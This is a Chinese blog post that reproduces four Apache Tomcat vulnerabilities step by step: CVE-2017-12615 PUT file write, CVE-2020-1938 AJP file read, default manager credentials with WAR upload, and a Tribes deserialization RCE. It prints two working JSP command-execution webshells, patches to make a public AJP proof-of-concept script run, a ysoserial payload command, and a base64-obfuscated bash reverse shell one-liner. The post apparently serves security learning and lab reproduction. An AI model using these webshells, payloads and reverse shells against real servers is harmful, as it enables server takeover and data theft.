#  Tomcat常见的漏洞汇总  
原创 xiaolong
                    xiaolong  淋烟雨漫江南   2026-11-18 03:35  
  
这篇文章主要记录关于tomcat比较常见的漏洞做一个简单的复现  
  
介绍  
  
Java 目前是网页开发中最受欢迎的编程语言，而Tomcat 是最受欢迎的Java中间件服务器之一。自首次发布以来，它已经使用了20多年。  
  
漏洞一  
  
Tomcat通过PUT方法实现任意写文件漏洞（CVE-2017-12615）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qNmib4Mp3vXaibpvpyebmg58jK20NjqqzytVXHMANb1LTRgaHGUE73Ckdia0Xo52cOOHaibnK571Lh6OKMnQPicsJoZicILXrywTfU6lzuXRiadH64/640?wx_fmt=png&from=appmsg "")  
  
修改GET方法为PUT返回201说明成功创建  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qNmib4Mp3vXb9lnpRVPD0UGqriaXncXwZbq6HcvQCzN39ACb48c3vGHSqovDdLibMFPD49hoatFgCxkicicIyBkIIemCVAMZPnMnicayQhvrJf8yA/640?wx_fmt=png&from=appmsg "")  
  
访问1.txt  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qNmib4Mp3vXbHNMkUOhUmq6ljox4CF5DejpjQwGy4O1gYzialHrB3G8kyywO83ZUus9PFvLk4HyK4E2Bf0ShNqBcPGARZ2XPQKSnicGAOibs0H8/640?wx_fmt=png&from=appmsg "")  
  
写入webshell 记得在1.jsp后面加/不然会报404  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qNmib4Mp3vXYsDsIAdDicnAyE3XC8R3Gz7pPou49K0IBHcYpzn5T7peO7Wp7B4qFIrEjiatvwhyT7K62zf7Qbsk0ozAibBp0TNAO0axAoeia7EQU/640?wx_fmt=png&from=appmsg "")  
  
执行代码  
```
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        java.io.BufferedReader br = new java.io.BufferedReader(
                new java.io.InputStreamReader(p.getInputStream()));
        String line;
        while ((line = br.readLine()) != null) out.println(line);
    }
%>
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qNmib4Mp3vXYjDVtUB2ibBQJnwvIB5zwFYQxdWtwgiap6DDFicU94AmFn6P1bvqjzxwrINkmA3DnEnPuibtUAjuqsqib70GZFpoSPfOZkibMiarib1yM/640?wx_fmt=png&from=appmsg "")  
  
漏洞二  
  
Aapache Tomcat AJP 任意文件读取/包含漏洞（CVE-2020-1938）  
  
直接用脚本梭哈  
  
如果有师傅运行脚本跟我一样的错误按照我的方法改就能读取文件  
```
https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi //poc
```  
  
运行脚本报错  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qNmib4Mp3vXYLAWgwLSYLmPP1UOr6wmic5RwtxzRo4FYbHQ0KZjBz00sic53mnQdzIOxBJwtV4Tz6nicG3J0GYvvssqf5yWS9viaKKv8eykKX0OU/640?wx_fmt=png&from=appmsg "")  
```
self.stream = self.socket.makefile("rb", bufsize=0)//选择下面的替换
```  
```
# 写法一：使用 buffering 参数（推荐）
self.stream = self.socket.makefile("rb", buffering=0)
# 写法二：省略缓冲参数，使用默认缓冲
self.stream = self.socket.makefile("rb")
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qNmib4Mp3vXYkBYSXDReHSsBUXwwsrs0XqFh3aSmvHMZpUt7fGz9XaGl48hLsYgicQhUCLmnjwkicU3B3JhxibwINQhU1sXbeib34nMEoYwdJOLM/640?wx_fmt=png&from=appmsg "")  
  
以及303行的  
```
print("".join([d.data for d in data])) //使用下面的替换
```  
```
print(b"".join([d.data for d in data]).decode("utf-8", errors="replace"))
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qNmib4Mp3vXYyfSZI9ibdJcmiciaiceASzqnfnq7icOf22U9hGdUb8gIpC22hz9ibLFxVGHh6LqibnzYyPBYJJvicichuHe568lMFxpQuXXfBdIfB98x0/640?wx_fmt=png&from=appmsg "")  
  
读取/WEB-INF/web.xml文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qNmib4Mp3vXYWicDL2Bj5oHnUXJhwibs3Q6ssibgoUY3xfMdchgErB7lKeYnbbjicUHx2vkI15d4FJWXIHV7V7auWdPGdBzowUxzjGenmdKiaBkRM/640?wx_fmt=png&from=appmsg "")  
  
可以读取webapps下的所有文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qNmib4Mp3vXbuUtAhVdqlFEUa647FhjiclE4c3icB7Y8wSMhnjoFJPkRAyBmhrtwbscMHD9WbddrdrSc0gBpZLN2cZHKxLUeKwDYzxKoXNVZAA/640?wx_fmt=png&from=appmsg "")  
  
读取index.jsp  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qNmib4Mp3vXYTsAA2y6dwiaStkJ19pNjyz21byw5YzlsODVTic9YxtKp2jzibRaxX7TqyI4rcmdCGYInofgSc6ywqgiaoSDnq3LJQmVWJzlAWelE/640?wx_fmt=png&from=appmsg "")  
  
漏洞三  
  
tomcat弱口令+后台getshell漏洞  
  
访问8080  
点击Manager管理口  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qNmib4Mp3vXatzic8jm710FX0sOY5iagL7l8oageb5sKHEphwtCzudxAfbeiaNHm1XpOt5lkaMwdiaQTibTc26QEYfWAZ4PjaJVVk8ju7yKlSmEdc/640?wx_fmt=png&from=appmsg "")  
  
  
输入默认口令tomcat/tomcat  
  
  
保存改代码为shell.jsp  
```
<%@ page contentType="text/html;charset=UTF-8" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null && !cmd.isEmpty()) {
        try {
            ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c", cmd);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            java.io.BufferedReader br = new java.io.BufferedReader(
                    new java.io.InputStreamReader(p.getInputStream(), "UTF-8"));
            String line;
            while ((line = br.readLine()) != null) {
                out.println(line);
            }
            int code = p.waitFor();
            out.println("\n[exitCode=" + code + "]");
        } catch (Exception e) {
            out.println("exec error: " + e);
        }
    }
%>
```  
  
制作war包  
```
jar -cvf shell.war ./index.jsp
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qNmib4Mp3vXYpmURWwqvy7lZwURlRnn8ia6hL8xIic9OKPGALEAHDib1osRiblBw7y0RL6icYLvufdDo5P7Jle3AmfIuDvDoboPUXZBcvdic8o4Cts/640?wx_fmt=png&from=appmsg "")  
  
上传访问并执行代码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qNmib4Mp3vXYdibdK0EWTLTicgIRicOk9ECO3UvubZQsNd7ly0ibwKhqNGNW2ytdibolIEkyXOVhic6Ie78ANMx4bw9HWr5bOEtwvkLtusTp5nQp90/640?wx_fmt=png&from=appmsg "")  
  
漏洞四  
  
Tomcat Tribes EncryptInterceptor 绕过远程代码执行（CVE-2026-34486）  
  
该漏洞利用 EncryptInterceptor 绕过程序，将未加密的Java 反序列化负载发送到 Tribes 接收端口。由于受攻击的容器在类路径上运输，任何 Apache Commons Collections小工具链都可以被用来执行任意系统命令。commons-collections 3.2.1  
  
使用  
ysoserial.jar生成序列化攻击载荷  
  
下载地址  
```
https://github.com/frohoff/ysoserial
```  
  
生成攻击载荷  
```
java -jar ysoserial-all.jar CommonsCollections6 "touch /tmp/success" > payload.ser
```  
  
执行poc  
```
poc.py -t target_ip -p 4000 -f payload.ser
```  
  
成功执行  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qNmib4Mp3vXZzQOvwrknyfYUKcVf2YYG4a8k7cUiaJ2uw5skJB9GduFAibOMnRCoibAlxJGzZho3azLxK3nPvUZe80UT6IacmK0eOQHAGaFV8jo/640?wx_fmt=png&from=appmsg "")  
  
查看是否已经创建文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qNmib4Mp3vXZnKqrJAtJn0GUFmTkflPM08TEAfWXqic3owHEDqJUtRpb7QRCXRskPbfJhyc6bhsmPjJ2oMIIsRKsxVmjcwYqgdQTkia67lBNCY/640?wx_fmt=png&from=appmsg "")  
  
反弹shell  
```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODg4OCAwPiYx}|{base64,-d}|{bash,-i}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qNmib4Mp3vXaibFoiaULnMFH3FC6gvU7AicYPMVVHcUVNZR39yLetg5LibZe12kL7wgAkfgIE3bhd6ErSbbIcCNpeT2ichAuJzZ1iab6DUgPuZQkxA/640?wx_fmt=png&from=appmsg "")  
  
成功接收shell  
  
  
